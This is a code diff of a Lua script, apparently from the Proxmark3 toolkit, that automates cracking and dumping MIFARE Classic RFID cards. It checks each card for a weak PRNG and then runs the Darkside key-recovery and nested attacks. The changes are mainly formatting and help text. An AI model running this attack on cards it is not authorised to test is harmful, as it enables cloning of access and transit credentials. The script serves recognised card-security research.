@@ -3,14 +3,18 @@ local lib14a = require('read14a')
 local cmds = require('commands')
 local utils = require('utils')
 
-example = "script run mifare_autopwn"
+copyright = ''
 author = "Martin Holst Swende"
-desc =
-[[
+version = 'v1.0.1'
+desc = [[
 This is a script which automates cracking and dumping mifare classic cards. It sets itself into
 'listening'-mode, after which it cracks and dumps any mifare classic card that you
 place by the device.
-
+]]
+example = [[
+script run mifare_autopwn
+]]
+usage = [[
 Arguments:
     -h          this help
     -d          debug logging on
@@ -33,7 +37,6 @@ local DEBUG = false
 -- A debug printout-function
 local function dbg(args)
     if not DEBUG then return end
-
     if type(args) == 'table' then
         local i = 1
         while result[i] do
@@ -47,15 +50,20 @@ end
 ---
 -- This is only meant to be used when errors occur
 local function oops(err)
-    print("ERROR: ",err)
-    return nil,err
+    print('ERROR:', err)
+    core.clearCommandBuffer()
+    return nil, err
 end
 ---
 -- Usage help
 local function help()
+    print(copyright)
+    print(author)
+    print(version)
     print(desc)
-    print("Example usage")
+    print('Example usage')
     print(example)
+    print(usage)
 end
 ---
 -- Waits for a mifare card to be placed within the vicinity of the reader.
@@ -67,7 +75,7 @@ local function wait_for_mifare()
         if res then return res end
         -- err means that there was no response from card
     end
-    return nil, "Aborted by user"
+    return nil, 'Aborted by user'
 end
 
 local function nested(key,sak)
@@ -85,7 +93,7 @@ local function nested(key,sak)
     else
         print("I don't know how many sectors there are on this type of card, defaulting to 16")
     end
-    local cmd = string.format("hf mf nested %d 0 A %s d", typ, key)
+    local cmd = string.format('hf mf nested %d 0 A %s d', typ, key)
     core.console(cmd)
 end
 
@@ -146,14 +154,14 @@ local function main(args)
     local print_message = true
     -- Read the parameters
     for o, a in getopt.getopt(args, 'hdk:') do
-        if o == "h" then help() return end
-        if o == "d" then DEBUG = true end
+        if o == 'h' then help() return end
+        if o == 'd' then DEBUG = true end
         if o == 'k' then key = a end
     end
 
     while not exit do
         if print_message then
-            print("Waiting for card or press any key to stop")
+            print('Waiting for card or press any key to stop')
             print_message = false
         end
         res, err = wait_for_mifare()
@@ -168,29 +176,29 @@ local function main(args)
 
             -- check if PRNG is WEAK
             if perform_prng_test() == 1 then
-                print("Card found, commencing crack on UID", uid)
+                print('Card found, commencing crack on UID', uid)
 
                 if #key == 12 then
-                    print("Using key: "..key);
+                    print('Using key: '..key);
                 else
                     -- Crack it
                     local cnt
                     err, res = core.mfDarkside()
-                    if     err == -1 then return oops("Button pressed. Aborted.")
-                    elseif err == -2 then return oops("Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests).")
-                    elseif err == -3 then return oops("Card is not vulnerable to Darkside attack (its random number generator is not predictable).")
+                    if     err == -1 then return oops('Button pressed. Aborted.')
+                    elseif err == -2 then return oops([[Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests).]])
+                    elseif err == -3 then return oops([[Card is not vulnerable to Darkside attack (its random number generator is not predictable).]])
                     elseif err == -4 then return oops([[
         Card is not vulnerable to Darkside attack (its random number generator seems to be based on the wellknown
         generating polynomial with 16 effective bits only, but shows unexpected behaviour.]])
-                    elseif err == -5 then return oops("Aborted via keyboard.")
+                    elseif err == -5 then return oops('Aborted via keyboard.')
                     end
                     -- The key is actually 8 bytes, so a
                     -- 6-byte key is sent as 00XXXXXX
                     -- This means we unpack it as first
                     -- two bytes, then six bytes actual key data
                     -- We can discard first and second return values
-                    _,_,key = bin.unpack("H2H6",res)
-                    print("Found valid key: "..key);
+                    _,_,key = bin.unpack('H2H6',res)
+                    print('Found valid key: '..key);
                 end
                 -- Use nested attack
                 nested(key, sak)
@@ -199,7 +207,7 @@ local function main(args)
 
                 if #key == 12 then exit = true end
             else
-                print("Card found, darkside attack useless PRNG hardend on UID", uid)
+                print('Card found, darkside attack useless PRNG hardend on UID', uid)
             end
             print_message = true
         end
